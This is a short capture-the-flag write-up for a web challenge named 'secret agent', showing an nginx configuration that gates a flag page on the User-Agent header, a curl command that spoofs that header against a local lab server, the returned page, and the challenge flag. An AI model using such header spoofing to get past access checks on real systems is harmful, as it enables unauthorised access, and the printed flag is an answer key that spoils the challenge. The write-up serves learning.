# secret agent

## Write-up

* Nginx configuration :  

```nginx
events {
}

http {
  server {
    listen 80;

    location = /flag.html {
      if ($http_user_agent = SuperSecretAgent) {
	rewrite ^ /flag.html break;
      }
      rewrite ^ /no_flag_for_you.html break;
    }

    location = /alive {
      return 200;
    }
  }
}
```

* When requesting `/flag.html`, the server checks if the User Agent HTTP header is `SuperSecretAgent`

* We can simply make the request with `SuperSecretAgent` as the User Agent :  

```bash
curl http://127.0.0.1:3003/flag.html -A SuperSecretAgent
```

* Output :  

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width-device-width, initial-scale=1.0" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet"/>
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet"/>
    <title>Secret Agent</title>
  </head>
  <body class="bg-gray-50">
    <header>
      <div class="flex flex-row bg-gray-100 px-5 py-2">
        <a href="/" class="hover:underline hover:text-blue-500 text-black py-1 px-4 font-bold">
          <i class="ml-2 fas fa-user-secret"></i> Secret Agent
        </a>
      </div>
    </header>

    <main>
      <div class="my-5 flex justify-center items-center relative z-20">
        <h1 class="text-black text-5xl font-bold">shellmates{$uuUuUUP3r_S3CR37_aG3Nt}</h1>
      </div>
    </main>

  </body>
</html>
```

## Flag

`shellmates{$uuUuUUP3r_S3CR37_aG3Nt}`
